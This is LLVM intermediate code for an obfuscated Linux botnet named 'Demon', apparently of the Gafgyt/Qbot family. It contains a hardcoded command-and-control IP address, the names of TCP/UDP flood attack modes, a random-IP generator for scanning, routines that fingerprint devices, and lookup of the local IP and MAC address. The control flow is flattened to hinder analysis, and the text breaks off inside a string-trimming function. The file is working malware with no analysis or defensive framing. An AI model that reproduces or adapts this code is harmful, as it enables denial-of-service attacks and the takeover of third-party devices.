; ModuleID = 'host/ir_fla/Demon.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [17 x i8] c"176.123.6.22:990\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pids = common global i32* null, align 8
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.11 = private unnamed_addr constant [159 x i8] c"4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B\00", align 1
@.str.12 = private unnamed_addr constant [356 x i8] c"lXfYi\18fYC7TFaCq5Hv982wuIiKbHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG3GVNDFc2iTHNYy7gss8dHboBdeKE1VcblH1AxrVyiqokw2RYFvd4cd1QxyaHawwP6go9feBeHdlvMRDLbEbty3Py8yVT3UTjy3ZKONXmMNvURTUZTkeH37XT9H5JwH0vKB1Yw2rSYkTwcTvx6OltSIlahFg92uCRbLM8amh8GaGGGRw56iNUTGLgi395vj9ZVVeP01k7Tvq3NRvxo########!!!!!!!!!!!!!!!@!@!@$!%@&$^!@%%^!@%*!(@%&*(!@%&!@*(%&!@()%*!@%))\00", align 1
@.str.13 = private unnamed_addr constant [193 x i8] c"/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23\00", align 1
@.str.14 = private unnamed_addr constant [60 x i8] c"xmiwdio MOQWI\22K (**(D8u9289d2892e9 NIOWJDiojwioWAJM DKLAM) \00", align 1
@.str.15 = private unnamed_addr constant [193 x i8] c"/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.17 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.19 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.20 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.21 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.22 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@.str.24 = private unnamed_addr constant [3 x i8] c"22\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"23\00", align 1
@.str.26 = private unnamed_addr constant [18 x i8] c"/etc/apt/apt.conf\00", align 1
@.str.27 = private unnamed_addr constant [20 x i8] c"Debian Based Device\00", align 1
@.str.28 = private unnamed_addr constant [14 x i8] c"/etc/yum.conf\00", align 1
@.str.29 = private unnamed_addr constant [18 x i8] c"REHL Based Device\00", align 1
@.str.30 = private unnamed_addr constant [11 x i8] c"Unknown OS\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.32 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.33 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.34 = private unnamed_addr constant [45 x i8] c"Sending TCP Packets To: %s:%d for %d seconds\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"STOMP\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.39 = private unnamed_addr constant [46 x i8] c"[Shelling]-->[%s]-->[%s]-->[%s]-->[%s]-->[%s]\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 476624921, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 476624921, label %10
    i32 -1934853602, label %14
    i32 -776901453, label %32
    i32 -1119490730, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -1934853602, i32 -1119490730
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -776901453, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 476624921, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -846224682, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -846224682, label %first
    i32 -1056509284, label %30
    i32 -2143331248, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -1056509284, i32 -2143331248
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 -2143331248, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1669992946, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1669992946, label %9
    i32 -930832907, label %13
    i32 1738244237, label %18
    i32 -1291981570, label %27
    i32 1682646285, label %29
    i32 -417316814, label %39
    i32 11744250, label %43
    i32 -1604185018, label %44
    i32 1655217623, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -930832907, i32 -1291981570
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 1738244237, i32 -1291981570
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -1291981570, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 1682646285, i32 -417316814
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -1669992946, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 11744250, i32 -1604185018
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 1655217623, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 1655217623, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 659975922, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 659975922, label %first
    i32 -699654374, label %16
    i32 -1898777913, label %17
    i32 1064437151, label %31
    i32 -641515768, label %32
    i32 1441438505, label %39
    i32 -417851779, label %40
    i32 1211987062, label %45
    i32 1726611879, label %51
    i32 -575256147, label %56
    i32 1234491479, label %58
    i32 1221928589, label %64
    i32 1285764021, label %67
    i32 -328986611, label %69
    i32 -1428716444, label %71
    i32 -1354031185, label %78
    i32 -90660171, label %86
    i32 1229388008, label %90
    i32 -1178124567, label %102
    i32 1065623642, label %105
    i32 -63501416, label %106
    i32 -492711867, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -699654374, i32 -1898777913
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -492711867, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)) #6
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #9
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 1064437151, i32 -641515768
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -492711867, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #6
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 1441438505, i32 -417851779
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -492711867, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 1211987062, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 1726611879, i32 -1428716444
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 -575256147, i32 -328986611
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 1234491479, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 1221928589, i32 1285764021
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 1234491479, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 -1428716444, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 1211987062, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 -1354031185, i32 -63501416
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #6
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #6
  store i32 0, i32* %10, align 4
  store i32 -90660171, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 1229388008, i32 1065623642
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.0* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 -1178124567, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 -90660171, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -63501416, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -492711867, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

declare i32 @close(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -43814624, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -43814624, label %10
    i32 1849780757, label %20
    i32 -1019039591, label %23
    i32 -856606686, label %24
    i32 471509948, label %29
    i32 -1167395185, label %38
    i32 2100849694, label %40
    i32 -1841097161, label %43
    i32 235944310, label %45
    i32 2011408121, label %50
    i32 843459487, label %62
    i32 193546366, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 1849780757, i32 -1019039591
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -43814624, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -856606686, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 471509948, i32 -1167395185
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 -1167395185, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 2100849694, i32 -1841097161
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -856606686, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
